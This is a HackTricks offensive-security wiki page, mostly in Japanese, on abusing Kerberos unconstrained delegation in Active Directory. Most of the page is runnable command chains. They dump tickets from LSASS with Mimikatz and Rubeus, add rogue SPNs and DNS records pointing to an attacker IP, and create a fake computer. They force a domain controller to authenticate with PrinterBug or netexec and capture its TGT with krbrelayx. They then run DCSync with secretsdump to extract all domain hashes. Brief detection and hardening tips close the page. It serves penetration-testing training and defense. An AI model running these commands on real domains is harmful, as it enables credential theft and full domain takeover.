# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

これは、Domain Administrator がドメイン内の任意の **Computer** に設定できる機能です。その後、ユーザーがその Computer に **logins** するたびに、そのユーザーの **TGT のコピー** が DC によって提供される **TGS 内に送信** され、**LSASS のメモリに保存** されます。そのため、対象マシンで Administrator 権限を持っていれば、**チケットを dump してユーザーになりすます** ことが、任意のマシン上で可能になります。

つまり、"Unconstrained Delegation" 機能が有効化された Computer に domain admin が **logins** し、あなたがそのマシン上で local admin 権限を持っている場合、チケットを dump して、どこでも Domain Admin になりすますことができます（domain privesc）。

[ userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 属性に [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) が含まれているかを確認することで、この属性を持つ **Computer** オブジェクトを **find** できます。これは LDAP filter の ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ を使って実行できます。powerview が行っているのもこれです：
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
**Mimikatz** または **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.** を使用して、Administrator（または被害ユーザー）の ticket をメモリにロードします。\
詳細情報: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team の Unconstrained delegation に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

攻撃者が **"Unconstrained Delegation" が許可されたコンピューターを compromise** できる場合、**Print server** を**誘導**して、そのコンピューターに対して**自動的にログイン**させ、サーバーのメモリに **TGT** を保存させることができます。\
その後、攻撃者は **Pass the Ticket attack を実行して**、Print server computer account のユーザーになりすますことができます。

任意のマシンに対して print server をログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample) を使用できます。
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGTがドメインコントローラーからのものであれば、[**DCSync attack**](acl-persistence-abuse/index.html#dcsync)を実行して、DCからすべてのハッシュを取得できます。\
[**この攻撃の詳細はired.teamを参照してください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

ここでは、**認証を強制する**その他の方法を紹介します。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

被害者に**Kerberos**であなたのUnconstrained delegationホストへ認証させる、その他のcoercion primitiveも利用できます。現代の環境では、到達可能なRPC surfaceに応じて、classic PrinterBug flowを**PetitPotam**、**DFSCoerce**、**ShadowCoerce**、**MS-EVEN**、または**WebClient/WebDAV**ベースのcoercionに置き換えることがよくあります。

### Unconstrained delegationが設定されたuser/service accountの悪用

Unconstrained delegationは**コンピューターオブジェクトに限定されません**。**user/service account**にも`TRUSTED_FOR_DELEGATION`を設定できます。この場合の実際の要件は、そのアカウントが**自身が所有するSPN**のKerberos service ticketを受け取る必要があることです。

これにより、非常に一般的な2つの攻撃経路が生じます。

1. Unconstrained delegationが設定された**user account**のパスワード/hashを侵害し、その同じアカウントに**SPNを追加**します。
2. アカウントにすでに1つ以上のSPNがあるものの、そのうちの1つが**古い/廃止されたhostname**を指している場合、SPN setを変更せずに、欠落している**DNS A record**を再作成するだけで認証フローをhijackできます。<sup>[[8]](#references)</sup>

Linuxでの最小限のflow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- これは、unconstrained principal が **service account** であり、参加済みホスト上での code execution ではなく、その credentials だけを持っている場合に特に有用です。
- 対象ユーザーにすでに **stale SPN** がある場合、AD に新しい SPN を書き込むよりも、対応する **DNS record** を再作成する方が目立ちにくい可能性があります。
- 最近の Linux-centric tradecraft では、`addspn.py`、`dnstool.py`、`krbrelayx.py` と 1 つの coercion primitive を使用します。この chain を完了するために Windows host に触れる必要はありません。

### attacker-created computer を使用した Unconstrained Delegation の悪用

Modern domains では、`MachineAccountQuota > 0`（デフォルトは 10）であることが多く、認証済みの任意の principal が最大 N 個の computer object を作成できます。さらに `SeEnableDelegationPrivilege` token privilege（または同等の権限）を持っていれば、新しく作成した computer を unconstrained delegation 用に trusted として設定し、privileged system からの inbound TGT を harvest できます。<sup>[[1]](#references)</sup>

High-level flow:

1) 自分が control する computer を作成する
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) 偽のホスト名をドメイン内で名前解決できるようにする
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) 攻撃者が制御するコンピューターで Unconstrained Delegation を有効化する
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
なぜこれが機能するのか: unconstrained delegation では、delegation-enabled computer 上の LSA が受信した TGT をキャッシュします。DC または privileged server に fake host への認証を行わせると、その machine TGT が保存され、export できます。

4) krbrelayx を export mode で起動し、Kerberos material を準備する
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/サーバーから偽装ホストへの認証を強制する
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
マシンが認証すると、krbrelayx は ccache ファイルを保存します。例:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) キャプチャした DC マシンの TGT を使用して DCSync を実行する
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` により、権限のないユーザーでも computer の作成が可能になります。それ以外の場合は、明示的な権限が必要です。
- computer に `TRUSTED_FOR_DELEGATION` を設定するには、`SeEnableDelegationPrivilege`（または domain admin）が必要です。
- fake host への名前解決（DNS A record）を確実に設定し、DC が FQDN で接続できるようにします。
- Coercion には、利用可能な vector（PrinterBug/MS-RPRN、EFSRPC/PetitPotam、DFSCoerce、MS-EVEN など）が必要です。可能であれば、DC ではこれらを無効化してください。
- 被害者 account に **"Account is sensitive and cannot be delegated"** が設定されている場合、または **Protected Users** のメンバーである場合、forwarded TGT は service ticket に含まれません。そのため、この chain では再利用可能な TGT を取得できません。<sup>[[9]](#references)</sup>
- 認証を行う client/server で **Credential Guard** が有効になっている場合、Windows は **Kerberos unconstrained delegation** をブロックします。そのため、operator の観点では、通常なら有効な coercion path が失敗する可能性があります。

検知と hardening のアイデア:

- UAC に `TRUSTED_FOR_DELEGATION` が設定された状態で computer account が作成された場合は、Event ID 4741 および 4742/4738（computer/user account の変更）を alert します。
- domain zone における通常とは異なる DNS A-record の追加を monitor します。
- 予期しない host からの 4768/4769、および non-DC host に対する DC-authentication の急増を監視します。
- `SeEnableDelegationPrivilege` を最小限の set に制限し、可能な場合は `MachineAccountQuota=0` を設定して、DC では Print Spooler を無効化します。LDAP signing と channel binding を適用します。

### Mitigation

- DA/Admin の login を特定の service に制限する
- privileged account に "Account is sensitive and cannot be delegated" を設定する

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
